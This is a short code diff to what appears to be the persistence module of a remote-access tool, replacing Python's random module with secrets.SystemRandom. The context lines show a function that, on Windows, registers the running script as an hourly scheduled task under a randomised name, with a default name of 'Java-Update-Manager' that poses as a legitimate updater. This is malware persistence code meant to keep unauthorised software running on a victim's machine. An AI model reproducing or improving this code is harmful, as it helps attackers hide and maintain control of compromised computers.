@@ -7,9 +7,9 @@ import os
 import sys
 import time
 import base64
-import random
 import string
 import subprocess
+import secrets
 
 # packages
 if sys.platform == 'win32':
@@ -181,7 +181,7 @@ def _add_scheduled_task(value=None, name='Java-Update-Manager'):
     try:
         if os.name == 'nt' and not _methods['scheduled_task'].established:
             value = sys.argv[0]
-            name  = util.variable(random.randint(6,11))
+            name  = util.variable(secrets.SystemRandom().randint(6,11))
             if value and os.path.isfile(value):
                 result  = subprocess.check_output('SCHTASKS /CREATE /TN {} /TR {} /SC hourly /F'.format(name, value), shell=True)
                 if 'SUCCESS' in result:
